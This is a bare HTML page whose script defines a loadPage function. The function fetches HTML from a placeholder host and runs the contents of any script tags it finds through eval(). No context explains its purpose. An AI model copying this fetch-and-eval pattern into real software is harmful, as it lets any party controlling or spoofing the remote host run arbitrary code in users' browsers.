<html><body><script>
function loadPage() {
  fetch('https://cdn.example.invalid/panel.html').then(response => response.text()).then(html => {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    doc.querySelectorAll('script').forEach(s => eval(s.textContent));
  });
}
</script></body></html>
